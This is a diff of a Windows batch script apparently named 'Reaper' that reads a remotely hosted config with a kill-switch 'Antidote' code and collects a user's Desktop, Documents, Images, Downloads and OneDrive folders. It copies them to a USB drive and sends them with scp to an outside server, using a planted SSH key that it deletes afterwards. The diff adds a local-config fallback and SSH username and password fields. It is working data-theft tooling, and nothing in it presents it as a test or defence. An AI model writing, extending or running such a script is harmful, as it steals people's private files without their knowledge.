@@ -13,7 +13,8 @@ for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
     echo %%i | findstr /i "Active=true" >nul
     if %errorlevel% equ 0 (
         :: The line "Active=true" is found
-        echo Configuration file is active. Running the script...
+        echo Remote Configuration file is active. Running the script...
+        set config_file='curl -L "%configUrl%"'
         goto Active
     ) else (
         :: The line "Active=true" is not found or is set to "Active=false"
@@ -36,11 +37,12 @@ if exist "Local-Config.cfg" (
     echo Local configuration file found. Checking if it is active...
 
     :: Check if the line "Active=true" exists in the local configuration file
-    findstr /i "Active=true" "Reaper-config.cfg" >nul
+    findstr /i "Active=true" "Local-Config.cfg" >nul
     if %errorlevel% equ 0 (
         :: The line "Active=true" is found in the local configuration file
         echo Local configuration file is active. Running the script...
-        goto Active'    
+        set "config_file=Local-Config.cfg"
+        goto Active    
     ) else (
         :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
         echo Local configuration file is not active. Exiting...
@@ -56,7 +58,7 @@ if exist "Local-Config.cfg" (
 
 :Active
 :: Retrieve the Antidote codes from the remote file
-for /f "tokens=2 delims== " %%a in ('curl -s "%configUrl%" ^| findstr /i "Antidote_Codes"') do (
+for /f "tokens=2 delims== " %%a in ('%config_file% ^| findstr /i "Antidote_Codes"') do (
     set "antidoteCode=%%~a"
     :: Remove the surrounding double quotes if present
     set "antidoteCode=!antidoteCode:"=!"
@@ -80,59 +82,65 @@ echo Antidote code not found. Running the script...
 
 
 :: Read the remote configuration file
-for /f "usebackq tokens=1* delims== " %%a in (`curl -L "%configUrl%"`) do (
- if /i "%%a"=="TARGET_SERVER" (
- :: Get the target server from the remote configuration
- set "target_server=%%b"
- ) else if /i "%%a"=="TARGET_PORT" (
- :: Get the target server port from the remote configuration
- set "target_port=%%b"
- ) else if /i "%%a"=="TARGET_FOLDER" (
- :: Get the target folder path from the remote configuration
- set "target_folder=%%b"
- ) else if /i "%%a"=="COPY_FILES" (
- :: Get the choice to copy files from the remote configuration
- set "CopyFiles=%%b"
- ) else if /i "%%a"=="ROBO_FLAGS" (
- :: Get the choice to copy files from the remote configuration
- set "robo_flags=%%b"
- )
+for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
+    if /i "%%a"=="TARGET_SERVER" (
+        :: Get the target server from the remote configuration
+        set "target_server=%%b"
+    ) else if /i "%%a"=="TARGET_PORT" (
+        :: Get the target server port from the remote configuration
+        set "target_port=%%b"
+    ) else if /i "%%a"=="SSH_USER" (
+        :: Get the SSH user from the remote configuration
+        set "ssh_user=%%b"
+    ) else if /i "%%a"=="SSH_PASS" (
+        :: Get the SSH password from the remote configuration
+        set "ssh_pass=%%b"
+    ) else if /i "%%a"=="TARGET_FOLDER" (
+        :: Get the target folder path from the remote configuration
+        set "target_folder=%%b"
+    ) else if /i "%%a"=="COPY_FILES" (
+        :: Get the choice to copy files from the remote configuration
+        set "CopyFiles=%%b"
+    ) else if /i "%%a"=="ROBO_FLAGS" (
+        :: Get the choice to copy files from the remote configuration
+        set "robo_flags=%%b"
+    )
 )
 
-:: manualy set variables
- set "target_server=none"
- set "target_port=none"
- set "ssh-user=none"
- set "ssh-pass=none"
- set "target_folder=none"
+:: manualy set variables for testing
+:: set "target_server=none"
+:: set "target_port=none"
+:: set "ssh_user=none"
+:: set "ssh-pass=none"
+:: set "target_folder=none"
 
 
 
 :: Validate if all the required variables are set
 if not defined target_server (
-    echo TARGET_SERVER is not set in the remote configuration file.
+    echo TARGET_SERVER is not set in the configuration file.
     pause
     exit /b 1
 )
 if not defined target_port (
-    echo TARGET_PORT is not set in the remote configuration file. Using default port 22.
-    set "target_port=22"  :: Set default port to 22 if not specified in the remote configuration
+    echo TARGET_PORT is not set in the configuration file. Using default port 22.
+    set "target_port=22"  :: Set default port to 22 if not specified in the configuration
     echo target port is set to %target_port% by defoult
     pause
 )
-if not defined ssh-user (
-    echo SSH-USER is not set in the remote configuration file.
-    set "ssh-user=reaper"  :: Set default user to reaper if not specified in the remote configuration
-    echo ssh user is set to %ssh-user% by defoult
+if not defined ssh_user (
+    echo SSH_USER is not set in the configuration file.
+    set "ssh_user=reaper"  :: Set default user to reaper if not specified in the configuration
+    echo ssh user is set to %ssh_user% by defoult
     pause
 )
-if not defined ssh-pass (
-    echo SSH-PASS is not set in the remote configuration file.
+if not defined ssh_pass (
+    echo SSH_PASS is not set in the configuration file.
     pause
     exit /b 1
 )
 if not defined target_folder (
-    echo target_folder is not set in the remote configuration file.
+    echo target_folder is not set in the configuration file.
     set "target_folder=~/Reaper-info-retrieve/%USERNAME%/"  :: Set default folder to ~/Reaper-info-retrieve/%USERNAME%/ if not specified in the remote configuration
     echo target folder is set to %target_folder% by defoult
     pause
@@ -223,7 +231,7 @@ echo Downloads copied
 echo Files copied successfully to USB (%usb_drive%)!
 pause
 cls
-echo SSH-USER: %ssh-user%
+echo ssh_user: %ssh_user%
 echo Target server:%target_server%
 echo Target port: %target_port%
 echo Target folder: %target_folder%
@@ -233,19 +241,19 @@ if /i "%CopyFiles%"=="y" (
     :: -------------------------------------- SSH copy ssh key -------------------------------------- ::
     xcopy /E /Y /h "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
     :: ---------------------------------- SSH copy host info server --------------------------------- ::
-    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%
-    scp -P %target_port%  %filename% %ssh-user%@%target_server%:%target_folder%
+    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%
+    scp -P %target_port%  %filename% %ssh_user%@%target_server%:%target_folder%
     :: ------------------------------------- SSH copy to server ------------------------------------- ::
-    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Desktop
-    scp -P %target_port% -r %desktop% %ssh-user%@%target_server%:%target_folder%Desktop
-    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Documents
-    scp -P %target_port% -r %documents% %ssh-user%@%target_server%:%target_folder%Documents
-    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Images
-    scp -P %target_port% -r %images% %ssh-user%@%target_server%:%target_folder%Images
-    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Downloads
-    scp -P %target_port% -r %downloads% %ssh-user%@%target_server%:%target_folder%/Downloads
-    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%OneDrive
-    scp -P %target_port% -r %onedrive% %ssh-user%@%target_server%:%target_folder%OneDrive
+    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Desktop
+    scp -P %target_port% -r %desktop% %ssh_user%@%target_server%:%target_folder%Desktop
+    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Documents
+    scp -P %target_port% -r %documents% %ssh_user%@%target_server%:%target_folder%Documents
+    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Images
+    scp -P %target_port% -r %images% %ssh_user%@%target_server%:%target_folder%Images
+    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Downloads
+    scp -P %target_port% -r %downloads% %ssh_user%@%target_server%:%target_folder%/Downloads
+    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%OneDrive
+    scp -P %target_port% -r %onedrive% %ssh_user%@%target_server%:%target_folder%OneDrive
     echo Files copied successfully!
     :: ------------------------------------- Deleate SSH key ------------------------------------- ::
     :: Delete the private key from the users .ssh folder        
